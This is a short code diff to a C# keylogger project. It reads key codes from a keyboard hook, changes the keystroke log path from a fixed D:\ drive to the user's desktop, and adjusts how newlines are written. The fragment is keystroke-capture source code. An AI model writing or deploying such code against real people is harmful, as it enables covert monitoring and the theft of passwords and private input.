@@ -125,7 +125,10 @@ namespace KeyLogger
                 int vkCode = Marshal.ReadInt32(lParam);
                 string dt = $"{DateTime.Now.ToShortDateString()}";
 
-                string fileName = $"D:\\logger_{dt}.txt";
+                string fileName = $"{GetDesktopPath()}" +
+                    "\\" +
+                    $"logger_{dt}.txt";
+
                 if (!File.Exists(fileName))
                 {
                     using (FileStream fs = File.Create(fileName)) { };
@@ -510,7 +513,7 @@ namespace KeyLogger
                     // Переход на новую строку.
                     if (countKeys % 6 == 0)
                     {
-                        sw.Write("\n");
+                        sw.Write(Environment.NewLine);
                     }
 
 
@@ -525,5 +528,12 @@ namespace KeyLogger
             }
         }
 
+        private static string GetDesktopPath()
+        {
+            string path = Environment.GetFolderPath(
+                Environment.SpecialFolder.DesktopDirectory
+                );
+            return path;
+        }
     }
 }
